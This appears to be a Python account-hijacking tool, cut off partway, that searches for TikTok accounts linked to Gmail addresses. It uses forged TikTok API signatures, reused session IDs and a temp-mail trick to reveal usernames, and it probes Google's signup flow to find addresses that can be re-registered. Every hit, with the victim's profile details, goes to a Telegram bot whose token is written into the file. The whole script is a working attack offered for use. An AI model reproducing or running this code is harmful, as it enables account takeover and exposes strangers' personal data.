import aiohttp,aiofiles
import asyncio
import random
import time
import requests
from PKK import Gmail
import uuid
import json
import string
import os
import re
import hashlib
import uuid
from datetime import datetime
from random import choice, randrange
from user_agent import generate_user_agent
from faker import Faker
from SignerPy import *
from hsopyt import Argus, Ladon, Gorgon
from ms4 import *
#from asmix import Instagram
from rich.console import Console
from rich.progress import Progress
from rich.panel import Panel
#uu=requests.get('https://raw.githubusercontent.com/muojoig7/tik/refs/heads/main/krff.txt').text
#key='krf'#input('Key : ')
#if key in uu:
#    	print('Good Login')
#    	os.system('clear')
#    	pass
#else:
#	print('وقفت الاداة @k_1_cc')
#	exit()
tok ='7913321809:AAErW-QM2HJWUUaci_jT76OcNG1r4QG0OkQ'# input('Token : ')
ID =7402878964#input('Id : ')
#url = f"https://api.telegram.org/bot{tok}/getChat?chat_id={ID}"
#res = requests.get(url).json()
#if res.get("ok"):
#    chat = res["result"]
#    username11 = chat.get("username", None)
#    first_name11 = chat.get("first_name", None)
#    print(f'هلا حبيبي {first_name11} نورت الاداة انتظر ثواني ')
#    #.sleep(5)
#os.system('clear')
#params = {
#    "chat_id": '@k_1_cc',
#    "user_id": ID 
#}
#try:
#    res = requests.get('https://api.telegram.org/bot7913321809:AAErW-QM2HJWUUaci_jT76OcNG1r4QG0OkQ/getChatMember', params=params, timeout=10).json()
#    #print(res)
#    if res.get("ok"):
#        status = res["result"]["status"]
#        if status in ["member", "administrator", "creator"]:
#            pass
#        else:
#            print('اكلخرا وانضم لقناتي ادب سز @k_1_cc')
#            exit()
#    else:
#        print("Error:", res.get("description", "Unknown error"))
#        exit()

#except requests.exceptions.RequestException as e:
#    print(f"Error connecting to Telegram API: {e}")
#    exit()
#except Exception as e:
#    #print(f"Unexpected error: {e}")
#    pass
    
hosts=['api16-normal-apix-quic.tiktokv.com', 'api16-normal-apix.tiktokv.com', 'api16-normal-baseline.tiktokv.com', 'api16-normal-c-alisg.tiktokv.com', 'api16-normal-c-useast1a.tiktokv.com', 'api16-normal-c-useast1a.musical.ly', 'api16-normal-no1a.tiktokv.eu', 'api16-normal-quic.tiktokv.com', 'api16-normal-useast5.tiktokv.us', 'api16-normal-useast5.us.tiktokv.com', 'api16-normal-zr.tiktokv.com', 'api16-normal.tiktokv.com', 'api16-normal.ttapis.com', 'api19-normal-c-alisg.tiktokv.com', 'api19-normal-c-useast1a.musical.ly', 'api19-normal-c-useast1a.tiktokv.com', 'api19-normal-useast5.us.tiktokv.com', 'api19-normal-zr.tiktokv.com', 'api19-normal.tiktokv.com', 'api2-19-h2.musical.ly', 'api2.musical.ly', 'api21-h2.tiktokv.com', 'api21-normal.tiktokv.com', 'api22-normal-c-alisg.tiktokv.com', 'api22-normal-c-useast1a.tiktokv.com', 'api22-normal-zr.tiktokv.com', 'api22-normal.tiktokv.com', 'api23-normal.tiktokv.com', 'api23-normal-zr.tiktokv.com', 'api3-normal.tiktokv.com', 'api31-normal-alisg.tiktokv.com', 'api31-normal.tiktokv.com', 'api31-normal-useast2a.tiktokv.com', 'api31-normal-zr.tiktokv.com', 'api32-normal-alisg.tiktokv.com', 'api32-normal.tiktokv.com', 'api32-normal-zr.tiktokv.com', 'api74-normal.tiktokv.com', 'api9-normal.tiktokv.com']
lin= [
    "f699c60e0671ac8cf07b47b98876e750", "7cf8a3e3bca42407ea32f928ba32554a",
    "6e6ebdef9d110ea8468066a99fb35431", "185a9f97624b8070e74e6e3670973f5c",
    "2b37fd4151b4eaf7196f5f5e7e659f64", "e75ed27910bc3b0d134faa20f7d6be86",
    "f2dbfc92b25541c5bce8cf50239a1c8b", "de2319ad927bad889e66008a9bcfbc6a",
    "1534fed19164846bdc0679359b961627", "3f87ee5dbe03993c0f6e602487f9ede8",
    "026268b95716b09091705c48002a7e95", "f98471c9220848e8fa3ad8ea31c86225",
    "13cfd7515fd4f8e7c3fb1c2baee1d4e5", "2427cb040ce70c87cb3b7027115bff4c",
    "1715803b0d3ac0d74b4ded219e2dc29f", "f7a3b3d4b075b192cffd1beb30b813c7",
    "67c2c22b58488d874c31b4286643f001", "c4fc9de1eb64c613f59572e8b2fcfdd8",
    "b84c01904844bfc45216d073852ef9b1", "86fd5bd98326e1478e6eec4aeb581640",
    "7957b4c38e4d1d3114bec3b8a23d7172", "c12715fc9ab601f89f18463312f7f400",
    "9f0c8fd90ac11845025201ea6fb81f1b", "686a259b53d792a96eb099e6326536f3",
    "74ec3f5c1d33d16ee3a1f6785fe78ec3", "ada25f00d415c4132222e4effa5ce82d",
    "9abb0f87feb47e0d06f881565d8eb8cd", "16639e388e0ba30f1d28501c55f06c86",
    "ee4a11d378dfa212af06cdee36efaee4", "4ac0724e4dec4619c9a1661e4aa29e15",
    "0359bb8217ffc2669f7c4c0b3ac63e52", "57944088296cc7a2e28dc2159bbc6354",
    "8dd15f4d3d6e751daf7622c54367036d", "f1dd9337d28e66926f3fa53459be5698",
    "2f01dd8e8a583daf36d893db276214f1", "677972bc0970cb4c2cb5aa62c0173739",
    "3e99fe2e40577af27dc4fb15f9b438f7"
]

Z = '\033[1;31m'
X = '\033[1;33m'
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;34m'
C = '\033[2;35m'
B = '\033[2;36m'
Y = '\033[1;34m'
Pk = '\x1b[38;5;231m'

h = gt = bg = bt = blog = blo = sese = 0
I = Console()
import kiloa
async def inf(email, h):
    
    try:
        exuser = TikTok1().GetUser(email+'@gmail.com')
        if exuser is not None:
         	
	        info = InfoTik.TikTok_Info(exuser)
	        level=kiloa.TikTok().GetLevel(exuser)
	        name = info.get("name", "")
	        followers = info.get("followers", "")
	        following = info.get("following", "")
	        like = info.get("like", "")
	        video = info.get("video", "")
	        countryn = info.get("country", "")
	        cdt = info.get("Date", "")
	        bio = info.get("bio", "")	        
	        tlg = f'''
      
Hit TiK ToK ✓ : {h}
BY : @D_B_HH  CH :  @k_1_cc
________________________
𝙣𝙖𝙢𝙚:{name}
𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚:{exuser}
𝙚𝙢𝙖𝙞𝙡: {email}@gmail.com 
𝙛𝙤𝙡𝙡𝙤𝙬𝙚𝙧𝙨: {followers}
𝙛𝙤𝙡𝙡𝙤𝙬𝙞𝙣𝙜: {following}
𝙡𝙞𝙠𝙚:{like}
𝙫𝙞𝙙𝙚𝙤: {video} 
𝙘𝙤𝙪𝙣𝙩𝙧𝙮: {countryn} 
𝙙𝙖𝙩𝙖: {cdt} 
𝙗𝙞𝙤: {bio}
Level : {level}
________________________
BY : @D_B_HH  CH :  @k_1_cc
'''
	        print(tlg)
	        requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={tlg}')
	        
	        
        elif exuser == None:
        	level=kiloa.TikTok().GetLevel(email)
	        info = InfoTik.TikTok_Info(email)
	        name = info.get("name", "")
	        followers = info.get("followers", "")
	        following = info.get("following", "")
	        like = info.get("like", "")
	        video = info.get("video", "")
	        countryn = info.get("country", "")
	        cdt = info.get("Date", "")
	        bio = info.get("bio", "")
	        email1 = email + '@gmail.com'
	        
	        tlg = f'''
يمكن صح او غلط روح استخرج يوزر 	        
Hit TiK ToK ✓ : {h}
BY : @D_B_HH  CH :  @k_1_cc
________________________
𝙣𝙖𝙢𝙚:{name}
𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚:{email}
𝙚𝙢𝙖𝙞𝙡: {email}@gmail.com 
𝙛𝙤𝙡𝙡𝙤𝙬𝙚𝙧𝙨: {followers}
𝙛𝙤𝙡𝙡𝙤𝙬𝙞𝙣𝙜: {following}
𝙡𝙞𝙠𝙚:{like}
𝙫𝙞𝙙𝙚𝙤: {video} 
𝙘𝙤𝙪𝙣𝙩𝙧𝙮: {countryn} 
𝙙𝙖𝙩𝙖: {cdt} 
𝙗𝙞𝙤: {bio}
Level : {level}
________________________
BY : @D_B_HH  CH :  @k_1_cc
'''
	        print(tlg)
	        requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={tlg}')
    except Exception as ee66:
        print(ee66)
        pass
        

import requests
import time
import random
import json
import string
from threading import Thread
import os
import user_agent
from requests import post
from user_agent import generate_user_agent
from random import choice
from random import randrange
import re
import hashlib
import uuid
from requests import get
import sys
from datetime import datetime

bi = random.randint(5, 208)
ror1 = f'\x1b[38;5;{bi}m'
memo = random.randint(100, 300)
ror = f'\x1b[38;5;{memo}m'
import aiohttp
import asyncio
import random
import time
from urllib.parse import urlencode
from MedoSigner import Argus, Gorgon, md5, Ladon

def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int = 2, platform: int = 19, unix: int = None):
    x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload is not None else None
    if not unix:
        unix = int(time.time())
    return Gorgon(params, unix, payload, cookie).get_value() | {
        "x-ladon": Ladon.encrypt(unix, license_id, aid),
        "x-argus": Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid,
                                  license_id=license_id, sec_device_id=sec_device_id,
                                  sdk_version=sdk_version_str, sdk_version_int=sdk_version)
    }

async def Tik(email,ses):
    host = random.choice(hosts)
    url = f'https://{host}/passport/email/bind_without_verify/?passport-sdk-version=0&app_language=en&&iid=7410413249743685382&ac=WIFI&channel=googleplay&aid=1233&app_name=musical_ly&version_code=310503&version_name=31.5.3&device_platform=android&os=android&ab_version=31.5.3&ssmix=a&device_type=Infinix+X6816&device_brand=Infinix&language=en&os_api=30&os_version=11&openudid=36dd31864f68ff6f&manifest_version_code=2023105030&resolution=720*1568&dpi=303&update_version_code=2023105030&_rticket=1726064910254&is_pad=0&current_region=IQ&app_type=normal&sys_region=IQ&mcc_mnc=41805&timezone_name=Asia%2FBaghdad&carrier_region_v2=418&residence=IQ&app_language=en&carrier_region=IQ&ac2=wifi5g&uoo=0&op_region=IQ&timezone_offset=10800&build_number=31.5.3&host_abi=arm64-v8a&locale=en&region=IQ&content_language=en%2C&ts=1722418819&cdid=556d8162-2721-4760-a509-a92b3cf27738&support_webview=1&cronet_version=2fdb62f9_2023-09-06&ttnet_version=4.2.152.11-tiktok&use_store_region_cookie=1'
    
    params = {
        "device_platform": "android",
        "aid": "1233",
        "version_code": "0",
        "version_name": "0",
        'device_id': str(random.randint(1, 10**19)),
    }
    
    m = sign(params=urlencode(params), payload="", cookie="")
    
    headers = {
        'sdk-version': '2',
        'user-agent': 'com.zhiliaoapp.musically/2021306050 (Linux; U; Android 13; ar; ANY-LX2; Build/HONORANY-L22CQ; Cronet/TTNetVersion:57844a4b 2019-10-16)',
        'x-argus': m["x-argus"],
        'x-ladon': m["x-ladon"],
        'x-khronos': m["x-khronos"],
        'x-gorgon': m["x-gorgon"],
    }
    
    data = {"email": email+'@gmail.com'}
    cookies = {"sessionid": random.choice(lin)}
    try:
            async with ses.post(url, headers=headers, data=data, cookies=cookies) as response:
                res = await response.text()
                
                if 'Email is linked to another account. Unlink or try another email.' in res:
                    return True
                elif 'Account is already linked' in res:
                    return False
                elif 'Session expired' in res:
                    return None
                #else:
#                    return f"Unexpected response: {res}"
                    
    except Exception as e:
            #requests.post(f'https://api.telegram.org/bot7913321809:AAErW-QM2HJWUUaci_jT76OcNG1r4QG0OkQ/sendMessage?chat_id=7402878964&text={e}')
            print(e)
            pass
 
    
red='\033[1;31m'
async def lo(email):
    global h, gt, bg, bt, blog, blo, sese
    logo='''
\033[1;31m───────█████████████████████
\033[1;31m────████▀─────────────────▀████
\033[1;31m──███▀───────────────────────▀███
\033[1;31m─██▀───────────────────────────▀██
\033[1;31m█▀───────────────────────────────▀█
\033[1;31m█─────────────────────────────────█
\033[1;31m█─────────────────────────────────█
\033[1;31m█─────────────────────────────────█
\033[1;31m█───█████─────────────────█████───█
\033[1;31m█──██▓▓▓███─────────────███▓▓▓██──█
\033[1;31m█──██▓▓▓▓▓██───────────██▓▓▓▓▓██──█
\033[1;31m█──██▓▓▓▓▓▓██─────────██▓▓▓▓▓▓██──█
\033[1;31m█▄──████▓▓▓▓██───────██▓▓▓▓████──▄█
\033[1;31m▀█▄───▀███▓▓▓██─────██▓▓▓███▀───▄█▀
\033[1;31m──█▄────▀█████▀─────▀█████▀────▄█
\033[1;31m─▄██───────────▄█─█▄───────────██▄
\033[1;31m─███───────────██─██───────────███
\033[1;31m─███───────────────────────────███
\033[1;31m──▀██──██▀██──█──█──█──██▀██──██▀
\033[1;31m───▀████▀─██──█──█──█──██─▀████▀
\033[1;31m────▀██▀──██──█──█──█──██──▀██▀
\033[1;31m──────────██──█──█──█──██
\033[1;31m──────────██──█──█──█──██
\033[1;31m──────────██──█──█──█──██
\033[1;31m──────────██──█──█──█──██
\033[1;31m──────────██──█──█──█──██
\033[1;31m──────────██──█──█──█──██
\033[1;31m──────────██──█──█──█──██
\033[1;31m──────────██──█──█──█──██
\033[1;31m──────────██──█──█──█──██
\033[1;31m──────────██──█──█──█──██
\033[1;31m──────────██──█──█──█──██
\033[1;31m──────────██──█──█──█──██
\033[1;31m───────────█▄▄█▄▄█▄▄█▄▄█
'''
    os.system('cls' if os.name == 'nt' else 'clear')
    Ylogo = Panel(logo, title="", border_style="red", title_align="center")
    Y = Panel(f"Hit : {h}\nBad : {bg}\nBlocks : {blog}", title="Gmail", border_style="green", title_align="center")
    S = Panel(f"Good : {gt}\nBad : {bt}\nBlocks : {blo}", title="TikTok", border_style="yellow", title_align="center")
    Ss = Panel(f"Tele : @D_B_HH [Mustafa] \n Ch : @k_1_cc \n LinkCh : https://t.me/k_1_cc \n My account : https://t.me/D_B_HH", title="Devloper", border_style="white", title_align="center")

    I.print(Ylogo,Y, S, Ss, sep="\n")
from user_agent import generate_user_agent
from SignerPy import *
import requests, SignerPy, json, secrets, uuid, binascii, os, time, random,re
class TikTok1:
    @staticmethod
    def xor(string):
          return "".join([hex(ord(c) ^ 5)[2:] for c in string])
    def GetUser(self,es):
        
        
        secret = secrets.token_hex(16)
        xor_email=self.xor(es)
        params = {
            "request_tag_from": "h5",
            "fixed_mix_mode": "1",
            "mix_mode": "1",
            "account_param": xor_email,
            "scene": "1",
            "device_platform": "android",
            "os": "android",
            "ssmix": "a",
            "type": "3736",
            "_rticket": str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
            "cdid": str(uuid.uuid4()),
            "channel": "googleplay",
            "aid": "1233",
            "app_name": "musical_ly",
            "version_code": "370805",
            "version_name": "37.8.5",
            "manifest_version_code": "2023708050",
            "update_version_code": "2023708050",
            "ab_version": "37.8.5",
            "resolution": "1600*900",
            "dpi": "240",
            "device_type": "SM-G998B",
            "device_brand": "samsung",
            "language": "en",
            "os_api": "28",
            "os_version": "9",
            "ac": "wifi",
            "is_pad": "0",
            "current_region": "TW",
            "app_type": "normal",
            "sys_region": "US",
            "last_install_time": "1754073240",
            "mcc_mnc": "46692",
            "timezone_name": "Asia/Baghdad",
            "carrier_region_v2": "466",
            "residence": "TW",
            "app_language": "en",
            "carrier_region": "TW",
            "timezone_offset": "10800",
            "host_abi": "arm64-v8a",
            "locale": "en-GB",
            "ac2": "wifi",
            "uoo": "1",
            "op_region": "TW",
            "build_number": "37.8.5",
            "region": "GB",
            "ts":str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
            "iid": str(random.randint(1, 10**19)),
            "device_id": str(random.randint(1, 10**19)),
            "openudid": str(binascii.hexlify(os.urandom(8)).decode()),
            "support_webview": "1",
            "okhttp_version": "4.2.210.6-tiktok",
            "use_store_region_cookie": "1",
            "app_version":"37.8.5"}
        cookies = {
            "passport_csrf_token": secret,
            "passport_csrf_token_default": secret,
            "install_id": params["iid"],
        }
        
        
        
        
        s=requests.session()
        cookies = {
            '_ga_3DVKZSPS3D': 'GS2.1.s1754435486$o1$g0$t1754435486$j60$l0$h0',
            '_ga': 'GA1.1.504663773.1754435486',
            '__gads': 'ID=0cfb694765742032:T=1754435487:RT=1754435487:S=ALNI_MbIZNqLgouoeIxOQ2-N-0-cjxxS1A',
            '__gpi': 'UID=00001120bc366066:T=1754435487:RT=1754435487:S=ALNI_MaWgWYrKEmStGHPiLiBa1zlQOicuA',
            '__eoi': 'ID=22d520639150e74a:T=1754435487:RT=1754435487:S=AA-AfjZKI_lD2VnwMipZE8ienmGW',
            'FCNEC': '%5B%5B%22AKsRol8AtTXetHU2kYbWNbhPJd-c3l8flgQb4i54HStVK8CCEYhbcA3kEFqWYrBZaXKWuO9YYJN53FddyHbDf05q1qY12AeNafjxm2SPp7mhXZaop_3YiUwuo_WHJkehVcl5z4VyD7GHJ_D8nI2DfTX5RfrQWIHNMA%3D%3D%22%5D%5D',
        }
        
        headers = {
            'accept': '*/*',
            'accept-language': 'en,ar;q=0.9,en-US;q=0.8',
            'application-name': 'web',
            'application-version': '4.0.0',
            'content-type': 'application/json',
            'origin': 'https://temp-mail.io',
            'priority': 'u=1, i',
            'referer': 'https://temp-mail.io/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'x-cors-header': 'iaWg3pchvFx48fY',
        }
        
        json_data = {
            'min_name_length': 10,
            'max_name_length': 10,
        }
        
        response = requests.post('https://api.internal.temp-mail.io/api/v3/email/new', cookies=cookies, headers=headers, json=json_data)
        name=response.json()["email"]
        url = "https://api16-normal-c-alisg.tiktokv.com/passport/account_lookup/email/"
        s.cookies.update(cookies)
        m=SignerPy.sign(params=params,cookie=cookies)
        
        headers = {
          'User-Agent': "com.zhiliaoapp.musically/2023708050 (Linux; U; Android 9; en_GB; SM-G998B; Build/SP1A.210812.016;tt-ok/3.12.13.16)",
          'x-ss-stub':m['x-ss-stub'],
          'x-tt-dm-status': "login=1;ct=1;rt=1",
          'x-ss-req-ticket':m['x-ss-req-ticket'],
          'x-ladon': m['x-ladon'],
          'x-khronos': m['x-khronos'],
          'x-argus': m['x-argus'],
          'x-gorgon': m['x-gorgon'],
          'content-type': "application/x-www-form-urlencoded",
        
        }
        
        response = requests.post(url, headers=headers,params=params,cookies=cookies)
        
        if 'data' in response.json():
            try:passport_ticket=response.json()["data"]["accounts"][0]["passport_ticket"]
            except Exception as e:return None
        else:
            return None     
        
        name_xor=self.xor(name)
        url = "https://api16-normal-c-alisg.tiktokv.com/passport/email/send_code/"
        params.update({"not_login_ticket":passport_ticket,"email":name_xor})
        m = SignerPy.sign(params=params, cookie=cookies)
        headers = {
            'User-Agent': "com.zhiliaoapp.musically/2023708050 (Linux; U; Android 9; en_GB; SM-G998B; Build/SP1A.210812.016;tt-ok/3.12.13.16)",
            'Accept-Encoding': "gzip",
            'x-ss-stub': m['x-ss-stub'],
            'x-ss-req-ticket': m['x-ss-req-ticket'],
            'x-ladon': m['x-ladon'],
            'x-khronos': m['x-khronos'],
            'x-argus': m['x-argus'],
            'x-gorgon': m['x-gorgon'],
        }
        response = s.post(url, headers=headers, params=params, cookies=cookies)
        
        time.sleep(5)
        cookies = {
            '_ga': 'GA1.1.504663773.1754435486',
            '__gads': 'ID=0cfb694765742032:T=1754435487:RT=1754435487:S=ALNI_MbIZNqLgouoeIxOQ2-N-0-cjxxS1A',
            '__gpi': 'UID=00001120bc366066:T=1754435487:RT=1754435487:S=ALNI_MaWgWYrKEmStGHPiLiBa1zlQOicuA',
            '__eoi': 'ID=22d520639150e74a:T=1754435487:RT=1754435487:S=AA-AfjZKI_lD2VnwMipZE8ienmGW',
            'FCNEC': '%5B%5B%22AKsRol8AtTXetHU2kYbWNbhPJd-c3l8flgQb4i54HStVK8CCEYhbcA3kEFqWYrBZaXKWuO9YYJN53FddyHbDf05q1qY12AeNafjxm2SPp7mhXZaop_3YiUwuo_WHJkehVcl5z4VyD7GHJ_D8nI2DfTX5RfrQWIHNMA%3D%3D%22%5D%5D',
            '_ga_3DVKZSPS3D': 'GS2.1.s1754435486$o1$g0$t1754435503$j43$l0$h0',
        }
        
        headers = {
            'accept': '*/*',
            'accept-language': 'en,ar;q=0.9,en-US;q=0.8',
            'application-name': 'web',
            'application-version': '4.0.0',
            'content-type': 'application/json',
            'origin': 'https://temp-mail.io',
            'priority': 'u=1, i',
            'referer': 'https://temp-mail.io/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'x-cors-header': 'iaWg3pchvFx48fY'
        }
        
        response = requests.get(
            'https://api.internal.temp-mail.io/api/v3/email/{}/messages'.format(name),
            cookies=cookies,
            headers=headers,
        )
        import re
        try:
            exEm = response.json()[0]
            match = re.search(r"This email was generated for ([\w.]+)\.", exEm["body_text"])
            if match:
                username = match.group(1)
                return username
        except Exception as e:return None
#print()        
import asyncio
import aiohttp
import random
import re
async def gm(email):
    N = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(random.randrange(5, 10)))
    b = (random.randrange(1980, 2010), random.randrange(1, 12), random.randrange(1, 28))#.
    long_encoded_string = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3Cf7Nqs-sCAAZfiOnPf4iN_32KOpLfQKL0ADQBEArZ1IBDTUyai2FYax3ViMI2wqBpWShhe-OPRhpMjnm9s14Yu65MknXEBWcyTyF3Jx0pzQAAAeGdAAAAC6cBB7EATZAxrowFF7vQ68oKqx7_sdcR_u8t8CJys-8G4opCIVySwUYaUnm-BovA8aThYLISPNMc8Pl3_B0GnkQJ_W4SIed6l6EcM7QLJ8AXVNAaVgbhsnD7q4lyQnlvR14HRW10oP85EU_bwG1E4QJH1V0KnVS4mIeoqB7zHOuxMuGifv6MB3GghUGTewh0tMN1jaf8yvX804tntlrlxm3OZgCZ2UxgDjUVOKFMv1Y3Txr16jJEJ56-T7qrPCtt6H1kmUvCIl_RDZzbt_sj5OLnbX1UvVA-VgG8-X9AJdvGhCKVhkf3iSkjy6_ZKsZSbsOsMjrm7ggnLdMStIf4AzbJIyMC7q4JMCaDaW_UI9SgquR8mHMpHGRmP7zY-WE47l7uRSpkI6oV93XJZ1zskJsxaDz7sDYHpzEL1RGPnkZU45XkIkwuc1ptU_AiM6SQyoZK7wFnhYxYfDQjSwaC7lOfngr6F2e4pDWkiC96QY4xLr6m2oUoDbyKR3ykccKEECEakFKzS-wSxIt9hK6nw-a9PEpVzhf6uIywZofNCs0KJOhhtv_ReG24DOC6NHX-FweCOkiYtT2sISrm6H8Wr4E89oU_mMWtpnXmhs8PB28SXw42-EdhRPsdcQkgKycOVT_IXwCc4Td9-t7715HP-L2XLk5i05aUrk-sHPPEz8SyL3odOb1SkwQ69bRQHfbPZr858iTDD0UaYWE_Jmb4wlGxYOSsvQ3EIljWDtj69cq3slKqMQu0ZC9bdqEh0p_T9zvsVwFiZThf19JL8PtqlXH5bgoEnPqdSfYbnJviQdUTAhuBPE-O8wgmdwl22wqkndacytncjwGR9cuXqAXUk_PbS-0fJGxIwI6-b7bhD7tS2DUAJk708UK5zFDLyqN6hFtj_AAjNM-XGIEqgTavCRhPnVT0u0l7p3iwtwKmRyAn42m3SwWhOQ6LDv-K2DyLl2OKfFu9Y-fPBh-2K2hIn2tKoGMgVbBR8AsVsYL7L6Bh5JIW7LCHaXNk3oDyHDx5QFaPtMmnIxcfFG90YSEPIgWV2nb67zDDacvvCkiPEQMXHJUcz1tuivaAgCTgW68wNYkUt89KJDhJTSWY2jcPsDIyCnS-SGESyR7mvbkvC3Robo0zVQm6q3Z73si9uqJiPmUGgBLycxUq2A_L3B-Hz35vBm5Oc5Hbe8hJToB03ilQzLa8Kld5BY8_kmmh6kfrOvi07uwfusHv3mKfijE2vaK3v2O2He41hCaOv3ExSfdPKb2V5nPPTw8ryyC5ZwlM_DLCU_k5xONsh4uplpRmydmJcit4aj5Ig0qLVF9MxIWU5xoDlvhKL9jHh-HVgIe-CPp4RMM5BfTxDgtESiF97RWjwrNeKn6Fc4311AdCrfZMcZ0F2JnQsfKAz4H-hoWbrOEVBkPcBt5umJ_iaCm0cQ2XTQMjzAtfWbRe6EGSxbkK-DXBl4EQM-6cnH1139MIHLzNou_Tltbl2HaomCS044CwhRNpe95KuYhM4Fz0Z_8rRjqy48tS_L4kQMX1CtxjBNfd4eUoaAIwAcz3LaL5BwL0DAYcV3xruTTuy6X8zFHe8fAIB9pJ_Pw0YJm3Ye28_tTg5xk0R4EU7_IPIHk6RrtSsG0Rfst3Qi5NRfWFg5h9LlmlHO_EUhdw1wbCICTqbS2A94aIBSCQzn7RmqOTTSIXwgFwnSBRKvoo0v9tKQ2rnMZsXRhzQgxwfmYOq29EUbuHmmWQjpRhfzX1Z6-5gXRPr4-PjrInsTiAi36xDyc8a1yTAhKMwnvf3GNqcK8lqx80VCASvcpYxGIAFl4QghroZbIJXlhccCWVF_xrzsw83QUdoZ5ExWi5f_cLvEXeZssdtan1orOaPJuWXT_0ryzpS9fOGtT68pL4HMAPLPpfwhiZ-wtZQU0oVy6T2L6oP1SIHQDU_QDaMR0MkStXNDj69r5cTDdYZiIbFkvWYeL1afTEljx1i2n2KKnDmpJfx2HeGCSZBMKZey24z_LDLA3MyJ2VBo4Zvmm23dwhWHOly56w9ul4sWzpHqgsqmKynRoaq9SXKrrmbR3f2GKBHSvy3Jm0Ln52zwIQfFSXpOjGXq5pkOXlvQc6MPuV3zADVmcUZs6ywI-ER3PkAaA-f-zG-ke_6jvOzGp6WF8UxnIk5tq3tus_R5pUjVQFjk6qZtWOP8VZd1TeJ54Oo_ywj8YAYCphkDtFYRMZSubmnI-F9LLlAfOiDwQ7r-iNvp8psduy9xrWdIpE_l23Y_qYJPHwvtopL3lB7juoEiFkhUts7NEugyWY-m6-9oEgsOY0lM4746V-XUxSeS7UkZkQZZM19g7GkWjJ61D98i0m2u_UYLnyDFQEaIxVhFcmS1Zq7OMsKm_gYpMt4LuD1F3N__Vj05QNyI59QNQADODveiHpfVva9Cd2AzBm9AKGwU4xDS_FyX3XRsRbfQFtqNzPf1LAERHlnHFn%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'
    common_headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://accounts.google.com/',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-browser-channel': 'stable',
        'x-browser-copyright': 'Copyright 2024 Google LLC. All rights reserved.',
        'x-browser-year': '2024',
    }
    batch_headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-same-domain': '1',
    }

    try:
        async with aiohttp.ClientSession(headers=common_headers) as session:
            params_get = {
                'biz': 'false',
                'continue': 'https://mail.google.com/mail/u/0/',
                'ddm': '1',
                'emr': '1',
                'flowEntry': 'SignUp',
                'flowName': 'GlifWebSignIn',
                'followup': 'https://mail.google.com/mail/u/0/',
                'osid': '1',
                'service': 'mail',
            }
            
            async with session.get('https://accounts.google.com/lifecycle/flows/signup', params=params_get) as response:
                response_text = await response.text()
                tl_match = re.search(r'TL=([^&]+)', str(response.url))
                tl = tl_match.group(1) if tl_match else None
                
                s1_match = re.search(r'"Qzxixc":"([^"]+)"', response_text)
                s1 = s1_match.group(1) if s1_match else None
                
                at_match = re.search(r'"SNlM0e":"([^"]+)"', response_text)
                at = at_match.group(1) if at_match else None

                if not all([tl, s1, at]):
                    return {'status': 'Error', 'Dev': 'Mustafa', 'Telegram': '@D_B_HH', 'message': 'Failed to extract initial tokens.'}

            batch_headers['x-goog-ext-391502476-jspb'] = f'["{s1}"]'
            session.headers.update(batch_headers)
            params_post_1 = {
                'rpcids': 'E815hb',
